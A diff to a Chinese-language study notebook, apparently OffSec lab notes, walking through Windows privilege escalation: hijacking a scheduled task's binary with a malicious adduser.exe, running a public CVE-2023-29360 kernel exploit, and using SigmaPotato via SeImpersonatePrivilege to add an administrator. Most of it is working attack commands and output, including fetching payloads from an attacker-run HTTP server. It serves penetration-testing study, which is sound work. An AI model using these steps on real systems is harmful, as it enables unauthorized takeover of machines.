@@ -1896,5 +1896,303 @@ john
 ```
 > 透過使用 AbuseFunction, Write-ServiceBinary，使用者 john被建立為本地管理員
 
-###  Abusing Other Windows Components
+##  Abusing Other Windows Components
+利用 Scheduled Tasks 和 exploits targeting 對 Windows 提權
+### Scheduled Tasks
+Windows 會利用 Scheduled Tasks 做各種自動化的任務，例如系統清理、更新管理或其他週期性工作。\
+這些 Scheduled Tasks 會由 Trigger 所控制，當條件滿足時，就會執行動作，觸發條件包括特定時間點、開機、使用者登入、特定 event 發生時。\
+**Question 1.** 若濫用 user task ，意義不大權限並沒有提升。需要嘗試 abuse NT AUTHORITY\SYSTEM 或 administrative 權限的 task\
+**Question 2.** 注意 trigger 的狀態，若在過去已滿足條件，並不會讓 task 觸發\
+**Question 3.** 如何執行潛在的提權
+
+以下範例：
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.218.220
+```
+
+#### 1. 查看 scheduled tasks 
+可以使用 [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2022-ps) 或 [schtasks /query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query) 查看 scheduled tasks
+```
+PS C:\Users\steve> schtasks /query /fo LIST /v
+...
+Folder: \Microsoft
+HostName:                             CLIENTWK220
+TaskName:                             \Microsoft\CacheCleanup
+Next Run Time:                        7/11/2022 2:47:21 AM
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        7/11/2022 2:46:22 AM
+Last Result:                          0
+Author:                               CLIENTWK220\daveadmin
+Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
+Start In:                             C:\Users\steve\Pictures
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode
+Run As User:                          daveadmin
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: Disabled
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        One Time Only, Minute
+Start Time:                           7:37:21 AM
+Start Date:                           7/4/2022
+...
+```
+> `/fo LIST`：指定輸出格式為 List
+`/v`：顯示所有 Verbose
+>> 列出大量的輸出，要從中找到符合上述 3 個 Question 的 task\
+
+找到`\Microsoft\CacheCleanup` 由 daveadmin 創建\
+條件: 在steve的 Pictures 主目錄中執行 BackendCacheCleanup.exe。且根據 Last Run Time 與 Next Run Time 可以猜測該任務每分鐘執行一次，執行身份以 daveadmin 運行。
+
+### 2. 查看指定 Task 權限
+```
+PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
+                                                BUILTIN\Administrators:(I)(F)
+                                                CLIENTWK220\steve:(I)(F)
+                                                CLIENTWK220\offsec:(I)(F)
+```
+> 擁有所有存取權限（F）
+
+### 3. 利用 Malicious exe 將原始 Task 覆蓋
+可以使用上方 [Service Binary Hijacking](#Service-Binary-Hijacking) 編譯好的 adduser.exe 
+```
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```
+PS C:\Users\steve> iwr -Uri http://192.168.45.212/adduser.exe -Outfile BackendCacheCleanup.exe
+PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
+```
+> 成功利用 Malicious exe 覆蓋 BackendCacheCleanup.exe
+
+### 4. 驗證提權結果
+```
+PS C:\Users\steve> net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave2
+daveadmin
+offsec
+The command completed successfully.
+```
+> 新增 user dave2 ，代表 Malicious exe 成功執行
+
+## Using Exploits
+兩種不同類型的提權漏洞:
+- application-based vulnerabilities
+在 [Locating Public Exploits](https://hackmd.io/@CHW/ryj8tW4UJl#Locating-Public-Exploits) 中提到的，Windows 系統上安裝的應用程式可能包含不同類型的漏洞，透過執行 administrative permissions 的應用程式漏洞。
+- Windows Kernel
+[Windows Kernel](https://en.wikipedia.org/wiki/Architecture_of_Windows_NT) 需要對 Windows 作業系統有深入了解
+
+### 1. 查看使用者權限
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.175.220
+```
+```
+PS C:\Users\steve> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeSecurityPrivilege           Manage auditing and security log     Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+> 沒有任何特殊權限
+
+### 2. 查看系統版本 與 patches installed 
+```
+PS C:\Users\steve> systeminfo
+
+Host Name:                 CLIENTWK220
+OS Name:                   Microsoft Windows 11 Pro
+OS Version:                10.0.22621 N/A Build 22621
+...
+PS C:\Users\steve> Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+
+Source        Description      HotFixID      InstalledBy          InstalledOn
+------        -----------      --------      -----------          -----------
+              Security Update  KB5025239                          5/4/2023 12:00:00 AM
+              Security Update  KB5025749                          5/4/2023 12:00:00 AM
+              Security Update  KB5017233                          9/25/2022 12:00:00 AM
+```
+>`Get-CimInstance -Class`: 使用 CIM（Common Information Model） 取得資訊\
+>`win32_quickfixengineering`: Windows WMI（Windows Management Instrumentation）顯示已安裝的系統更新的 Hotfix\
+>`| Where-Object { $_.Description -eq "Security Update" }`: 只顯示 Description 為 "Security Update" 的目標。
+>> Windows 22H2 版本上沒有太多安全性更新
+
+可以查看 [Microsoft Security Response Center](https://msrc.microsoft.com/) 的 Security vulnerabilities\
+其中 [CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release) 提供了 exploit code 和  pre-compiled version exploit 。在漏洞的官方網站 MSRC，[微軟應該會根據漏洞提供 patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360)，patch 編號為 KB5027215，但我們在目標機器上沒有看到 (代表未修補)。
+
+### 3. 嘗試使用 public exploit
+```
+PS C:\Users\steve\Desktop> whoami
+clientwk220\steve
+PS C:\Users\steve\Desktop> .\CVE-2023-29360.exe
+[+] Device Description: Microsoft Streaming Service Proxy
+Hardware IDs:
+        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
+[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
+[+] First mapped _MDL: 25f9aa00140
+[+] Second mapped _MDL: 25f9aa10040
+[+] Unprivileged token reference: ffffd1072dde6061
+[+] System token reference: ffffd1071de317d5
+Microsoft Windows [Version 10.0.22621.1555]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\steve\Desktop>whoami
+nt authority\system
+```
+> public exploit 成功提權，以上是利用 Kernel Exploit 的方式
+
+>[!Important]
+>**濫用 Windows 特權（Privilege Abuse**）\
+>Windows 作業系統中的某些 Privileges 允許特定使用者執行敏感操作，例如：
+`SeImpersonatePrivilege`（冒充權限）\
+`SeBackupPrivilege`（備份權限）\
+`SeDebugPrivilege`（除錯權限）\
+若 whoami /priv 顯示 SeImpersonatePrivilege，表示 attacker 可以利用它來提權。
+
+>[!Important]
+>**Named Pipe 進行提權**\
+>建立惡意 Named Pipe、誘導高權限服務連線、冒充 SYSTEM\
+>工具：[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
+>> 專門利用 `SeImpersonatePrivilege` 來進行權限提升。\
+透過 Named Pipe 來誘導 NT AUTHORITY\SYSTEM 連線，最終讓攻擊者執行高權限命令或獲取 SYSTEM shell。
+
+## SigmaPotato
+以下範例利用 SigmaPotato 提權
+### 1. 查看使用者權限
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.175.220 4444
+Microsoft Windows [Version 10.0.22621.1555]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeSecurityPrivilege           Manage auditing and security log          Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+> dave 擁有 `SeImpersonatePrivilege` 權限
+
+### 2. 嘗試使用 PrintSpoofer 提權
+```
+┌──(chw㉿CHW)-[~/Tools/SigmaPotato]
+└─$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+┌──(chw㉿CHW)-[~/Tools/SigmaPotato]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```
+C:\Users\dave>powershell
+powershell
+Windows PowerShell
+
+PS C:\Users\dave> iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
+iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
+```
+### 3. 執行 SigmaPotato
+利用 SigmaPotato 提權，並新增一個 Administrator: dave4
+```
+PS C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net user dave4 lab /add"
+[+] Starting Pipe Server...
+[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+[+] Pipe Connected!
+...
+[+] Process Started with PID: 2004
+
+[+] Process Output:
+The command completed successfully.
+
+PS C:\Users\dave> net user
+net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave                     
+dave4                    daveadmin                DefaultAccount           
+Guest                    offsec                   steve                    
+WDAGUtilityAccount       
+The command completed successfully.
+
+PS C:\Users\dave> .\SigmaPotato "net localgroup Administrators dave4 /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+[+] Starting Pipe Server...
+[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+[+] Pipe Connected!
+...
+[+] Process Started with PID: 10872
+
+[+] Process Output:
+The command completed successfully.
+
+
+PS C:\Users\dave> net localgroup Administrators
+net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave4
+daveadmin
+offsec
+The command completed successfully.
+```
+>`.\SigmaPotato "net user dave4 lab /add"`:\
+> `dave4` 建立新帳戶名稱, `lab` 帳戶密碼, `/add` 代表新增該帳戶\
+> `.\SigmaPotato "net localgroup Administrators dave4 /add"`:\
+> `Administrators` 本機管理員群組, `dave4` 加入管理員群組的帳戶, `/add` 表示將 dave4 加入 Administrators Group。
+>> 成功提權
+
+
+# Linux Privilege Escalation
+如何 enumerate Linux machines 與 Linux privileges 的結構
+## Enumerating Linux
 
